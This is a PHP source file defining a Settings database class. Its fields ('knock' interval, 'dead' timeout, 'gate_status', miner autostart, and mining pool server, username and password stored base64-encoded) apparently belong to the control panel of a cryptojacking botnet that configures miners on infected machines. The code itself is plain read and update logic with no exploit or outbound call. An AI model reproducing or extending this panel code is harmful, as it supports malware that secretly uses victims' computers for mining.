<?php
class Settings{
 
    // database connection and table name
    private $conn;
    private $table_name = "settings";
 
    // object properties
    public $id;
    public $knock;
    public $dead;
    public $gate_status;
    public $miner_autostart;
    public $miner_hwidAsUser;
    public $mining_algorithm;
    public $mining_server;
    public $mining_username;
    public $mining_password;
 
    // constructor with $db as database connection
    public function __construct($db){
        $this->conn = $db;
    }

        // read products
    public function read(){
    
        // select all query
        $query = "SELECT
                    *    
                FROM
                    " . $this->table_name . "
                Limit 1";
    
        // prepare query statement
        $stmt = $this->conn->prepare($query);
    
        // execute query
        $stmt->execute();
    
        return $stmt;
    }

    public function update(){
 
    // update query
    $query = "UPDATE
                " . $this->table_name . "
            SET
                knock = :knock,
                dead = :dead,
                gate_status = :gate_status,
                miner_autostart = :miner_autostart,
                miner_hwidAsUser = :miner_hwidAsUser,
                mining_algorithm = :mining_algorithm,
                mining_server = :mining_server,
                mining_username = :mining_username,
                mining_password = :mining_password
            WHERE
                id = :id";

    // prepare query statement
    $stmt = $this->conn->prepare($query);
 
    // sanitize
    $this->knock=htmlspecialchars(strip_tags($this->knock));
    $this->dead=htmlspecialchars(strip_tags($this->dead));
    $this->gate_status=htmlspecialchars(strip_tags($this->gate_status));
    $this->miner_autostart=htmlspecialchars(strip_tags($this->miner_autostart));
    $this->miner_hwidAsUser=htmlspecialchars(strip_tags($this->miner_hwidAsUser));
    $this->mining_algorithm=htmlspecialchars(strip_tags($this->mining_algorithm));
    $this->mining_server=htmlspecialchars(strip_tags($this->mining_server));
    $this->mining_username=htmlspecialchars(strip_tags($this->mining_username));
    $this->mining_password=htmlspecialchars(strip_tags($this->mining_password));
    $this->id=htmlspecialchars(strip_tags($this->id));
 
    // bind new values
    $stmt->bindParam(':knock', $this->knock);
    $stmt->bindParam(':dead', $this->dead);
    $stmt->bindParam(':gate_status', $this->gate_status);
    $stmt->bindParam(':miner_autostart', $this->miner_autostart);
    $stmt->bindParam(':miner_hwidAsUser', $this->miner_hwidAsUser);
    $stmt->bindParam(':mining_algorithm', base64_encode($this->mining_algorithm));
    $stmt->bindParam(':mining_server', base64_encode($this->mining_server));
    $stmt->bindParam(':mining_username', base64_encode($this->mining_username));
    $stmt->bindParam(':mining_password', base64_encode($this->mining_password));
    $stmt->bindParam(':id', $this->id);
    // execute the query
    

    if($stmt->execute()){
        return true;
    }
 
    return false;
    }

}